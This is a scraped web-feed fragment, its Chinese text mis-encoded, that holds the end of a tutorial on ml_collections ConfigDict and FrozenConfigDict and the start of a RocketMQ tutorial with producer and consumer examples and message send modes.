<span class="hljs-comment"># ä¸Šé”çŠ¶æ€ä¸‹ ä¾æ—§ç¦æ­¢æ–°å¢/åˆ é™¤ï¼ˆå®‰å…¨å…œåº•ï¼‰</span>
<span class="hljs-keyword">try</span>:
    cfg.device = <span class="hljs-string">"cuda"</span>
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nä¸Šé”ç¦æ­¢æ–°å¢: <span class="hljs-subst">{e.args[<span class="hljs-number">0</span>]}</span>"</span>)
</code></pre>
<h3 data-id="heading-10">2. æ–¹å¼2: FrozenConfigDict()</h3>
<ul>
<li>åˆ›å»ºï¼Œç‰¹æ€§ï¼šç¦æ­¢ä¿®æ”¹ã€åˆ é™¤ã€æ–°å¢</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ­£ç¡®å¯¼å…¥</span>
<span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict
<span class="hljs-keyword">from</span> ml_collections.config_dict <span class="hljs-keyword">import</span> FrozenConfigDict

<span class="hljs-comment"># âœ”ï¸ æ–¹å¼1ï¼šConfigDict è½¬ FrozenConfigDict</span>
cfg = ConfigDict()
cfg.lr = <span class="hljs-number">0.001</span>
cfg.batch_size = <span class="hljs-number">32</span>
<span class="hljs-comment"># åµŒå¥—ConfigDict æ­£ç¡®å†™æ³•</span>
cfg.model = ConfigDict()
cfg.model.dropout = <span class="hljs-number">0.2</span>
cfg.model.backbone = <span class="hljs-string">"resnet18"</span>

f_cfg = FrozenConfigDict(cfg)

<span class="hljs-comment"># âœ”ï¸ æ–¹å¼2ï¼šç›´æ¥åˆ›å»º FrozenConfigDict (ä¼ å­—å…¸)</span>
f_cfg2 = FrozenConfigDict({<span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>, <span class="hljs-string">"batch_size"</span>:<span class="hljs-number">32</span>})

<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">20</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"FrozenConfigDictåªè¯»é…ç½®ï¼š"</span>, f_cfg)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ˜¯å¦ä¸ºå†°å°é…ç½®ï¼š"</span>, <span class="hljs-built_in">isinstance</span>(f_cfg, FrozenConfigDict)) <span class="hljs-comment"># True</span>

<span class="hljs-comment"># æ‰€æœ‰ã€å†™æ“ä½œã€‘å…¨éƒ¨ç¦æ­¢</span>
<span class="hljs-comment"># 1. âŒ ç¦æ­¢ä¿®æ”¹å·²æœ‰å­—æ®µ</span>
<span class="hljs-keyword">try</span>:
    f_cfg.lr = <span class="hljs-number">0.0005</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nâŒ ä¿®æ”¹æŠ¥é”™: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 2. âŒ ç¦æ­¢æ–°å¢å­—æ®µ</span>
<span class="hljs-keyword">try</span>:
    f_cfg.epochs = <span class="hljs-number">200</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âŒ æ–°å¢æŠ¥é”™: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 3. âŒ ç¦æ­¢åˆ é™¤å­—æ®µ</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">del</span> f_cfg.batch_size
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âŒ åˆ é™¤æŠ¥é”™: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 4. âŒ æ— lock/unlockæ–¹æ³•ï¼Œå¤©ç”Ÿåªè¯»ï¼Œæ— éœ€ä¸Šé”</span>
<span class="hljs-keyword">try</span>:
    f_cfg.lock()
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âŒ æ— lockæ–¹æ³•: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># å”¯ä¸€æ”¯æŒçš„æ“ä½œï¼šã€è¯»å–ã€‘ </span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span>*<span class="hljs-number">20</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"âœ… è¯»å–åŸºç¡€å­—æ®µï¼š"</span>, f_cfg.lr)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"âœ… è¯»å–åµŒå¥—å­—æ®µï¼š"</span>, f_cfg.model.dropout)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"âœ… å­—å…¸æ–¹å¼è¯»å–ï¼š"</span>, f_cfg[<span class="hljs-string">"batch_size"</span>])
</code></pre>
<ul>
<li>FrozenConfigDictä¸ConfigDictè½¬æ¢</li>
</ul>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æ­£ç¡®å¯¼å…¥</span>
from ml_collections import ConfigDict
from ml_collections.config_dict import FrozenConfigDict

<span class="hljs-comment"># âœ”ï¸ è½¬æ¢1: ConfigDict â†’ FrozenConfigDict (å†»ç»“ï¼Œå¯å˜â†’ä¸å¯å˜)</span>
<span class="hljs-attr">cfg</span> = ConfigDict({<span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>, <span class="hljs-string">"batch_size"</span>:<span class="hljs-number">32</span>})
<span class="hljs-attr">frozen_cfg</span> = FrozenConfigDict(cfg)

<span class="hljs-comment"># âœ”ï¸ è½¬æ¢2: FrozenConfigDict â†’ ConfigDict (è§£å†»ï¼Œä¸å¯å˜â†’å¯å˜ï¼Œæ¢å¤æ‰€æœ‰æƒé™)</span>
<span class="hljs-attr">unfrozen_cfg</span> = ConfigDict(frozen_cfg)

<span class="hljs-comment"># è§£å†»å âœ… æ¢å¤å…¨éƒ¨æ“ä½œæƒé™ï¼šå¢/åˆ /æ”¹ éƒ½å¯ä»¥</span>
<span class="hljs-attr">unfrozen_cfg.lr</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">4</span>        <span class="hljs-comment"># ä¿®æ”¹ âœ”ï¸</span>
<span class="hljs-attr">unfrozen_cfg.device</span> = <span class="hljs-string">"cuda"</span>  <span class="hljs-comment"># æ–°å¢ âœ”ï¸</span>
del unfrozen_cfg.batch_size   <span class="hljs-comment"># åˆ é™¤ âœ”ï¸</span>
print("âœ… è§£å†»åConfigDictï¼š", unfrozen_cfg)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RocketMQä»å®æˆ˜åˆ°æºç ï¼šå®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶ï¼ˆä¸‡å­—ç¯‡å¹…ï¼‰]]></title>    <link>https://juejin.cn/post/7597283981185122356</link>    <guid>https://juejin.cn/post/7597283981185122356</guid>    <pubDate>2026-01-20T14:12:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981185122356" data-draft-id="7597243334177374248" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RocketMQä»å®æˆ˜åˆ°æºç ï¼šå®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶ï¼ˆä¸‡å­—ç¯‡å¹…ï¼‰"/> <meta itemprop="keywords" content="åç«¯,RocketMQ,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-20T14:12:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ€’æ”¾å§å¾·å¾·"/> <meta itemprop="url" content="https://juejin.cn/user/2502950820787672"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RocketMQä»å®æˆ˜åˆ°æºç ï¼šå®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶ï¼ˆä¸‡å­—ç¯‡å¹…ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2502950820787672/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ€’æ”¾å§å¾·å¾·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:12:51.000Z" title="Tue Jan 20 2026 14:12:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»29åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RocketMQä»å®æˆ˜åˆ°æºç ï¼šå®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶</h2>
<blockquote>
<p>ğŸ˜„ç”Ÿå‘½ä¸æ¯ï¼Œå†™ä½œä¸æ­¢</p>
<p>ğŸ”¥ ç»§ç»­è¸ä¸Šå­¦ä¹ ä¹‹è·¯ï¼Œå­¦ä¹‹åˆ†äº«ç¬”è®°</p>
<p>ğŸ‘Š æ€»æœ‰ä¸€å¤©æˆ‘ä¹Ÿèƒ½åƒå„ä½å¤§ä½¬ä¸€æ ·</p>
<p>ğŸ† <a href="https://juejin.cn/user/2502950820787672" target="_blank" title="https://juejin.cn/user/2502950820787672">åšå®¢é¦–é¡µ</a> Â Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Flyd-code%2F" target="_blank" title="https://www.cnblogs.com/lyd-code/" ref="nofollow noopener noreferrer">@æ€’æ”¾å§å¾·å¾·</a>Â Â <a href="https://link.juejin.cn?target=https%3A%2F%2Flydandtry.github.io%2F" target="_blank" title="https://lydandtry.github.io/" ref="nofollow noopener noreferrer">Toè®°å½•é¢†åœ°</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_43843951%3Ftype%3Dblog" target="_blank" title="https://blog.csdn.net/qq_43843951?type=blog" ref="nofollow noopener noreferrer">@ä¸€ä¸ªæœ‰æ¢¦æœ‰æˆçš„äºº</a></p>
<p>ğŸŒåˆ†äº«å­¦ä¹ å¿ƒå¾—ï¼Œæ¬¢è¿æŒ‡æ­£ï¼Œå¤§å®¶ä¸€èµ·å­¦ä¹ æˆé•¿ï¼</p>
</blockquote>
<p><em>è½¬å‘è¯·æºå¸¦ä½œè€…ä¿¡æ¯</em>Â  <strong>@æ€’æ”¾å§å¾·å¾·(æ˜é‡‘) @ä¸€ä¸ªæœ‰æ¢¦æœ‰æˆçš„äºº(CSDN)</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c33ed4ee428469db4621f0d3f673b67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=ZyU9aRoqKl3hAsUfbYsLVPSurBU%3D" alt="rocketmqå°é¢.png" loading="lazy"/></p>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>å‰é¢ä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬ç®€å•å­¦ä¹ äº† RockerMQ çš„å®‰è£…ä»¥åŠç®€å• demoï¼Œç°åœ¨æˆ‘ä»¬å°±è¿›ä¸€æ­¥å­¦ä¹  RockerMQ çš„æ¶ˆæ¯æœºåˆ¶ã€‚æœ¬ç¯‡ç¯‡å¹…è¾ƒå¤§ï¼Œå†…å®¹è¾ƒå¤šï¼Œåç»­ä¼šå°†æ¯ä¸ªæ¶ˆæ¯æœºåˆ¶è¿›è¡ŒæŠ½å–ã€‚</p>
<h3 data-id="heading-2">1 åŸºç¡€ä½¿ç”¨</h3>
<p>é€šè¿‡ rocket çš„ä»£ç ä¸­çš„ example æ¡ˆä¾‹ï¼Œé‡Œé¢æœ‰ç®€å•çš„ä¾‹å­ã€‚ï¼ˆåŒ…ï¼šorg.apache.rocketmq.example.quickstartï¼‰</p>
<p>ç”Ÿäº§è€…ä»£ç ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">public class Producer {

    /**
     * The number of produced messages.
     */
    public static final int MESSAGE_COUNT = 1000;
    public static final String PRODUCER_GROUP = "Study1";
    public static final String DEFAULT_NAMESRVADDR = "192.168.109.134:9876";
    public static final String TOPIC = "TopicTest";
    public static final String TAG = "TagA";

    public static void main(String[] args) throws MQClientException, InterruptedException {

        // åˆ›å»ºç”Ÿäº§è€…ï¼ŒæŒ‡å®šç”Ÿäº§ç»„
        DefaultMQProducer producer = new DefaultMQProducer(PRODUCER_GROUP);

        // è®¾ç½®Nameserveråœ°å€
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);

        // å¯åŠ¨ç”Ÿäº§è€…
        producer.start();

        for (int i = 0; i &lt; MESSAGE_COUNT; i++) {
            try {
                // åˆ›å»ºæ¶ˆæ¯ä½“ï¼šè®¢é˜…ä¸»é¢˜ã€Tagã€æ¶ˆæ¯ä½“
                Message msg = new Message(TOPIC,
                        TAG,
                        ("Hello RocketMQ " + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );

                // å‘é€æ¶ˆæ¯
                SendResult sendResult = producer.send(msg, 20 * 1000);
                System.out.printf("%s%n", sendResult);
            } catch (Exception e) {
                e.printStackTrace();
                Thread.sleep(1000);
            }
        }
        // å…³é—­ç”Ÿäº§è€…ï¼Œé‡Šæ”¾èµ„æº
        producer.shutdown();
    }
}
</code></pre>
<p>æ¶ˆè´¹è¿™ä»£ç ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">public class Consumer {

    public static final String CONSUMER_GROUP = "Study1";
    public static final String DEFAULT_NAMESRVADDR = "192.168.109.134:9876";
    public static final String TOPIC = "TopicTest";

    public static void main(String[] args) throws MQClientException {

        // åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„
        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);

        // è®¾ç½®Nameserveråœ°å€
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);

        // å¦‚æœç‰¹å®šçš„æ¶ˆè´¹ç¾¤ä½“æ˜¯å…¨æ–°çš„ï¼Œè¯·æŒ‡å®šä»å“ªé‡Œå¼€å§‹
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);

        // é…ç½®è®¢é˜…ä¸»é¢˜Topicã€Tag
        consumer.subscribe(TOPIC, "*");

        // è®¾ç½®å›è°ƒå‡½æ•°ï¼Œå¤„ç†æ¶ˆæ¯
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf("%s Receive New Messages: %s %n", Thread.currentThread().getName(), msg);
            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });

        // å¯åŠ¨æ¶ˆè´¹è€…ï¼Œå¯åŠ¨åä¼šä¸€ç›´æŒ‚ç€ï¼ŒæŒç»­å¤„ç†æ¶ˆæ¯
        consumer.start();

        System.out.printf("Consumer Started.%n");
    }
}
</code></pre>
<p>å®¢æˆ·ç«¯ç¼–ç¨‹é€»è¾‘é¡ºåºæ¯”è¾ƒå›ºå®šã€‚</p>
<p>â‘  ç”Ÿäº§è€…å›ºå®šæ­¥éª¤</p>
<ul>
<li>åˆ›å»ºç”Ÿäº§è€…ï¼ŒæŒ‡å®šç”Ÿäº§ç»„</li>
<li>è®¾ç½®Nameserveråœ°å€</li>
<li>å¯åŠ¨ç”Ÿäº§è€…</li>
<li>åˆ›å»ºæ¶ˆæ¯ä½“ï¼šè®¢é˜…ä¸»é¢˜ã€Tagã€æ¶ˆæ¯ä½“</li>
<li>å‘é€æ¶ˆæ¯</li>
<li>å…³é—­ç”Ÿäº§è€…ï¼Œé‡Šæ”¾èµ„æº</li>
</ul>
<p>â‘¡ æ¶ˆè´¹è€…å›ºå®šæ­¥éª¤</p>
<ul>
<li>åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</li>
<li>è®¾ç½®Nameserveråœ°å€</li>
<li>å¦‚æœç‰¹å®šçš„æ¶ˆè´¹ç¾¤ä½“æ˜¯å…¨æ–°çš„ï¼Œè¯·æŒ‡å®šä»å“ªé‡Œå¼€å§‹</li>
<li>é…ç½®è®¢é˜…ä¸»é¢˜Topicã€Tag</li>
<li>è®¾ç½®å›è°ƒå‡½æ•°ï¼Œå¤„ç†æ¶ˆæ¯</li>
<li>å¯åŠ¨æ¶ˆè´¹è€…ï¼Œå¯åŠ¨åä¼šä¸€ç›´æŒ‚ç€ï¼ŒæŒç»­å¤„ç†æ¶ˆæ¯</li>
</ul>
<h3 data-id="heading-3">2 ç¡®è®¤æ¶ˆæ¯æœºåˆ¶</h3>
<p>æ¶ˆæ¯æ˜¯å¿…å…ˆè¦ä¿è¯å®‰å…¨æ€§ï¼Œè€Œè¿™åŒ…å«äº†ä¸¤ç§ï¼Œä¸€æ˜¯è¦ç¡®ä¿æ¶ˆæ¯å‘é€åˆ° Broker ä¸Šï¼ŒäºŒæ˜¯è¦ç¡®ä¿æ¶ˆè´¹è€…èƒ½å¤Ÿæ­£å¸¸ä» Broker æ¶ˆè´¹ã€‚RocketMQ æä¾›äº†å®Œå–„çš„æ¶ˆæ¯ç¡®è®¤æœºåˆ¶ï¼Œç¡®ä¿æ¶ˆæ¯çš„å¯é ä¼ é€’ã€‚ä¸»è¦åˆ†ä¸ºç”Ÿäº§è€…å‘é€ç¡®è®¤å’Œæ¶ˆè´¹è€…æ¶ˆè´¹ç¡®è®¤ä¸¤å¤§éƒ¨åˆ†ã€‚</p>
<h4 data-id="heading-4">2.1 ç”Ÿäº§è€…ç«¯</h4>
<p>ç”Ÿäº§è€…é€šè¿‡å¤šæ¬¡é‡è¯•çš„æœºåˆ¶ä¿è¯æ¶ˆæ¯æ­£å¸¸å‘é€åˆ° Brokerã€‚ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åï¼Œéœ€è¦ç¡®è®¤ Broker æ˜¯å¦æˆåŠŸæ¥æ”¶å¹¶æŒä¹…åŒ–æ¶ˆæ¯ï¼Œæ ¸å¿ƒä¾èµ– Broker çš„å“åº”ç»“æœï¼Œä¸åŒå‘é€æ¨¡å¼çš„ç¡®è®¤æ–¹å¼ä¸åŒã€‚æ¶ˆæ¯ç”Ÿäº§è€…çš„ 3 ç§æ¶ˆæ¯å‘é€æ–¹æ³•ï¼šåŒæ­¥å‘é€ã€å¼‚æ­¥å‘é€ã€å•å‘å‘é€ï¼ˆ3 ç§ç®€å•ä»£ç ä¸Šæ–‡å‡æœ‰æåŠï¼‰ã€‚</p>
<h5 data-id="heading-5">2.1.1 å‘é€æ¨¡å¼ä¸ç¡®è®¤é€»è¾‘</h5>

























<table><thead><tr><th align="center">æ–¹å¼</th><th>ç¡®è®¤æ–¹å¼</th><th>åœºæ™¯</th></tr></thead><tbody><tr><td align="center">åŒæ­¥å‘é€</td><td>ç”Ÿäº§è€…é˜»å¡ç­‰å¾… Broker è¿”å›<code>SendResult</code>ï¼Œé€šè¿‡<code>SendStatus.SEND_OK</code>åˆ¤æ–­æ˜¯å¦æˆåŠŸ</td><td>æ ¸å¿ƒä¸šåŠ¡ï¼ˆå¦‚äº¤æ˜“ã€æ”¯ä»˜ï¼‰ï¼Œå¿…é¡»ç¡®ä¿æ¶ˆæ¯æŠ•é€’æˆåŠŸ</td></tr><tr><td align="center">å¼‚æ­¥å‘é€</td><td>é€šè¿‡<code>SendCallback</code>å›è°ƒå‡½æ•°æ¥æ”¶ç»“æœï¼š<code>onSuccess</code>è¡¨ç¤ºæˆåŠŸï¼Œ<code>onException</code>è¡¨ç¤ºå¤±è´¥</td><td>é«˜å¹¶å‘åœºæ™¯ï¼Œæ— éœ€é˜»å¡ç­‰å¾…ç»“æœ</td></tr><tr><td align="center">å•å‘å‘é€</td><td>åªå‘é€æ¶ˆæ¯ï¼Œä¸ç­‰å¾… Broker å“åº”ï¼Œæ— ç¡®è®¤æœºåˆ¶</td><td>éæ ¸å¿ƒä¸šåŠ¡ï¼ˆå¦‚æ—¥å¿—é‡‡é›†ï¼‰ï¼Œå…è®¸å°‘é‡ä¸¢å¤±</td></tr></tbody></table>
<p>Broker ç«¯çš„åˆ·ç›˜ / å¤åˆ¶ç­–ç•¥ä¼šå½±å“ç¡®è®¤çš„å¯é æ€§ï¼š</p>
<ul>
<li><strong>åˆ·ç›˜ç­–ç•¥</strong>ï¼šåŒæ­¥åˆ·ç›˜ï¼ˆæ¶ˆæ¯å†™å…¥åç«‹å³åˆ·ç£ç›˜ï¼Œç¡®è®¤æ…¢ä½†å¯é ï¼‰ã€å¼‚æ­¥åˆ·ç›˜ï¼ˆé»˜è®¤ï¼Œå†™å…¥å†…å­˜åç«‹å³è¿”å›ç¡®è®¤ï¼Œæ€§èƒ½é«˜ï¼‰ï¼›</li>
<li><strong>ä¸»ä»å¤åˆ¶</strong>ï¼šåŒæ­¥å¤åˆ¶ï¼ˆä¸» Broker éœ€ç­‰å¾…ä» Broker åŒæ­¥å®Œæˆå†ç¡®è®¤ï¼‰ã€å¼‚æ­¥å¤åˆ¶ï¼ˆé»˜è®¤ï¼Œä¸» Broker å†™å…¥åç›´æ¥ç¡®è®¤ï¼‰ã€‚</li>
</ul>
<h5 data-id="heading-6">2.1.2 å•å‘å‘é€</h5>
<p>å•å‘å‘é€çš„æƒ…å†µä¸‹ï¼Œç”Ÿäº§è€…åªç®¡å¾€ Broker å‘é€æ¶ˆæ¯ï¼Œå¹¶ä¸å…³å¿ƒ Broker ç«¯æ˜¯å¦æœ‰æ¥æ”¶åˆ°ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">// å•å‘å‘é€ï¼ˆæ— ç¡®è®¤ï¼‰
producer.sendOneway(message);
</code></pre>
